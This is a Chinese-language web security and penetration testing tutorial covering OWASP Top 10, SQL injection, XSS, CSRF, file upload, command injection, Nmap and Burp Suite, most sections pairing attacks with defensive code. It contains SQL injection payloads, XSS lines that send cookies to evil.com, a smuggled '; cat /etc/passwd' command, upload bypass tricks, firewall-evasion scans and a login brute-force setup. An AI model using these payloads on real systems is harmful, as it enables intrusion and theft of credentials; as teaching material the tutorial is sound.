---
order: 2
title: Web安全与渗透测试
module: cybersecurity
category: 网络安全
difficulty: intermediate
description: 'OWASP Top 10漏洞、SQL注入、XSS、CSRF、文件上传与命令执行漏洞、渗透测试流程、Nmap扫描、Burp Suite漏洞扫描。'
author: fanquanpp
updated: '2026-06-14'
related:
  - cybersecurity/安全基础与防御
  - cybersecurity/二进制安全与应急响应
  - cybersecurity/安全工具与实战
prerequisites: []
---

## 1. OWASP Top 10

### 1.1 2021 版 OWASP Top 10

| 排名 | 风险                   | 说明                             |
| :--- | :--------------------- | :------------------------------- |
| A01  | 权限控制失效           | 越权访问、IDOR、CORS 配置错误    |
| A02  | 加密机制失效           | 弱密码、明文存储、不安全协议     |
| A03  | 注入                   | SQL/NoSQL/OS/LDAP 注入           |
| A04  | 不安全设计             | 缺乏安全架构、威胁建模不足       |
| A05  | 安全配置错误           | 默认配置、目录遍历、错误信息泄露 |
| A06  | 易受攻击和过时的组件   | 使用已知漏洞的第三方库           |
| A07  | 身份识别和认证失败     | 弱密码策略、会话管理缺陷         |
| A08  | 软件和数据完整性失败   | 不安全的 CI/CD、反序列化漏洞     |
| A09  | 安全日志和监控失效     | 日志不足、告警缺失               |
| A10  | 服务器端请求伪造(SSRF) | 内网探测、云元数据泄露           |

## 2. SQL 注入

### 2.1 注入类型

| 类型     | 特点                     | 检测难度 |
| :------- | :----------------------- | :------- |
| 联合查询 | UNION SELECT 拼接        | 低       |
| 报错注入 | 利用数据库报错信息回显   | 低       |
| 布尔盲注 | 通过真/假响应判断        | 中       |
| 时间盲注 | 通过响应延迟判断         | 高       |
| 堆叠查询 | 多语句执行（;分隔）      | 低       |
| 二次注入 | 数据存储后再次使用时触发 | 高       |

### 2.2 注入示例与防御

```sql
-- 联合查询注入
-- 原始查询: SELECT * FROM users WHERE id = '$id'
-- 注入 payload: ' UNION SELECT 1,username,password FROM users --
SELECT * FROM users WHERE id = '' UNION SELECT 1,username,password FROM users --'

-- 布尔盲注
-- payload: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
-- 逐字符爆破密码

-- 时间盲注
-- payload: ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(3), 0) --
```

**防御措施**：

```python
#  不安全：字符串拼接
query = f"SELECT * FROM users WHERE id = '{user_id}'"

#  安全：参数化查询
import sqlite3
conn = sqlite3.connect('app.db')
cursor = conn.cursor()
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

#  安全：ORM 框架
# SQLAlchemy
user = session.query(User).filter(User.id == user_id).first()

#  安全：输入验证
import re
if not re.match(r'^\d+$', user_id):
    raise ValueError("Invalid user ID")
```

## 3. XSS 跨站脚本

### 3.1 XSS 类型

| 类型       | 注入位置       | 持久性 | 危害 |
| :--------- | :------------- | :----- | :--- |
| 反射型 XSS | URL 参数       | 否     | 中   |
| 存储型 XSS | 服务器存储     | 是     | 高   |
| DOM 型 XSS | 客户端 JS 渲染 | 否     | 中   |

### 3.2 XSS 攻击示例

```html
<!-- 反射型 XSS -->
<!-- URL: https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script> -->

<!-- 存储型 XSS -->
<!-- 留言板提交: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)"> -->

<!-- DOM 型 XSS -->
<!-- 页面 JS: document.getElementById('output').innerHTML = location.hash.slice(1) -->
<!-- URL: https://example.com/page#<img src=x onerror=alert(1)> -->
```

### 3.3 XSS 防御

```python
# 后端输出编码
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    safe_query = escape(query)  # HTML 实体编码
    return f'<p>搜索结果: {safe_query}</p>'
```

```javascript
// 前端防御
// 1. 使用 textContent 代替 innerHTML
element.textContent = userInput;

// 2. DOMPurify 清洗 HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// 3. Content Security Policy
// HTTP 响应头
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

```python
# Flask CSP 配置
from flask_talisman import Talisman
app = Flask(__name__)
Talisman(app, content_security_policy={
    'default-src': "'self'",
    'script-src': "'self'",
    'style-src': "'self' 'unsafe-inline'"
})
```

## 4. CSRF 跨站请求伪造

### 4.1 攻击原理

```
1. 用户登录 bank.com，获取会话 Cookie
2. 用户访问恶意网站 evil.com
3. evil.com 页面包含:
   <img src="https://bank.com/transfer?to=hacker&amount=10000">
4. 浏览器自动携带 bank.com 的 Cookie 发送请求
5. bank.com 服务器认为是合法操作
```

### 4.2 CSRF 防御

```python
# Flask-WTF CSRF Token
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
csrf = CSRFProtect(app)

# 模板中
# <form method="POST">
#   <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
#   ...
# </form>
```

```python
# SameSite Cookie 属性
app.config.update(
    SESSION_COOKIE_SECURE=True,     # 仅 HTTPS
    SESSION_COOKIE_HTTPONLY=True,    # JS 不可读
    SESSION_COOKIE_SAMESITE='Lax'   # 限制跨站发送
)
```

```python
# 验证 Origin/Referer 头
from flask import request, abort

@app.before_request
def check_origin():
    if request.method in ('POST', 'PUT', 'DELETE'):
        origin = request.headers.get('Origin', '')
        allowed = ['https://www.fandex.local', 'https://fandex.local']
        if origin not in allowed:
            abort(403)
```

## 5. 文件上传漏洞

### 5.1 常见绕过方式

| 绕过方式       | 方法                           |
| :------------- | :----------------------------- |
| 后缀名绕过     | .php5、.phtml、.php.jpg        |
| MIME 类型绕过  | 修改 Content-Type: image/jpeg  |
| 大小写绕过     | .PhP、.pHp                     |
| 双写绕过       | .pphphp（过滤 php 后剩余 php） |
| %00 截断       | shell.php%00.jpg               |
| .htaccess 上传 | 自定义解析规则                 |

### 5.2 安全上传实现

```python
import os
import uuid
from pathlib import Path
from flask import request, jsonify

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def allowed_file(filename):
    ext = filename.rsplit('.', 1)[-1].lower()
    return ext in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400

    file = request.files['file']

    # 1. 检查文件扩展名
    if not allowed_file(file.filename):
        return jsonify({'error': 'File type not allowed'}), 400

    # 2. 检查文件大小
    file.seek(0, os.SEEK_END)
    size = file.tell()
    file.seek(0)
    if size > MAX_FILE_SIZE:
        return jsonify({'error': 'File too large'}), 400

    # 3. 重命名文件（防止路径穿越）
    ext = file.filename.rsplit('.', 1)[-1].lower()
    safe_name = f"{uuid.uuid4().hex}.{ext}"

    # 4. 保存到 Web 根目录外
    upload_dir = '/data/uploads'
    file.save(os.path.join(upload_dir, safe_name))

    return jsonify({'filename': safe_name}), 200
```

## 6. 命令执行漏洞

### 6.1 命令注入

```python
#  不安全：直接拼接用户输入
import os
def ping_host(host):
    os.system(f"ping -c 3 {host}")  # 危险！
    # 攻击: host = "127.0.0.1; cat /etc/passwd"

#  安全：使用 subprocess + 参数列表
import subprocess
def ping_host_safe(host):
    # 输入验证
    if not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host):
        raise ValueError("Invalid IP address")
    result = subprocess.run(
        ['ping', '-c', '3', host],
        capture_output=True, text=True, timeout=10
    )
    return result.stdout
```

## 7. 渗透测试流程

### 7.1 标准流程

```
1. 前期交互 → 确定范围、规则、目标
2. 信息收集 → 被动/主动侦察
3. 威胁建模 → 识别攻击面和攻击路径
4. 漏洞分析 → 扫描、验证、分类
5. 渗透攻击 → 利用漏洞获取访问权限
6. 后渗透   → 权限提升、横向移动、数据获取
7. 报告撰写 → 发现、风险评级、修复建议
```

### 7.2 信息收集

```bash
# 被动信息收集
whois example.com                     # 域名注册信息
dig example.com ANY                   # DNS 记录
theHarvester -d example.com -b all    # 邮箱/子域名收集

# 主动信息收集
nmap -sn 192.168.1.0/24              # 主机发现
nmap -sV -sC -p- 192.168.1.1        # 全端口服务识别
nmap -O 192.168.1.1                  # 操作系统识别
nmap --script vuln 192.168.1.1       # 漏洞扫描脚本
```

## 8. Nmap 端口扫描

### 8.1 扫描类型

| 参数 | 扫描类型       | 特点                   | 隐蔽性 |
| :--- | :------------- | :--------------------- | :----- |
| -sS  | SYN 半开扫描   | 不完成三次握手，速度快 | 高     |
| -sT  | TCP 全连接扫描 | 完成三次握手           | 低     |
| -sU  | UDP 扫描       | 扫描 UDP 端口          | 中     |
| -sA  | ACK 扫描       | 检测防火墙规则         | 高     |
| -sF  | FIN 扫描       | FIN 包探测             | 高     |

### 8.2 常用命令

```bash
# 快速扫描常用端口
nmap -F 192.168.1.0/24

# 全端口扫描 + 服务版本 + 默认脚本
nmap -sV -sC -p- -T4 192.168.1.1

# 指定端口扫描
nmap -p 22,80,443,3306,8080 192.168.1.1

# 操作系统检测
nmap -O --osscan-guess 192.168.1.1

# 漏洞扫描
nmap --script=vulscan/vulscan.nse 192.168.1.1

# 绕过防火墙
nmap -f -D RND:10 --data-length 32 192.168.1.1

# 输出结果
nmap -sV -oX scan_results.xml 192.168.1.0/24
```

## 9. Burp Suite 漏洞扫描

### 9.1 核心模块

| 模块     | 功能                      |
| :------- | :------------------------ |
| Proxy    | 拦截和修改 HTTP 请求/响应 |
| Scanner  | 自动化漏洞扫描            |
| Intruder | 自定义攻击载荷暴力破解    |
| Repeater | 手动重放和修改请求        |
| Decoder  | 编码/解码工具             |
| Comparer | 请求/响应对比             |

### 9.2 常用工作流

```
1. 配置浏览器代理 → 127.0.0.1:8080
2. 开启 Intercept → 捕获请求
3. 发送到 Repeater → 手动测试参数
4. 发送到 Intruder → 标记攻击点，设置 Payload
5. 运行 Scanner → 自动扫描漏洞
6. 分析结果 → 验证漏洞、编写报告
```

### 9.3 Intruder 暴力破解示例

```
攻击类型: Sniper（单参数）/ Pitchfork（多参数并行）/ Cluster Bomb（多参数组合）

目标请求:
POST /login HTTP/1.1
username=§admin§&password=§password§

Payload 设置:
- username: 常用用户名字典
- password: 常用密码字典

Grep-Match:
- 匹配 "Login successful" → 成功
- 匹配 "Invalid credentials" → 失败
```
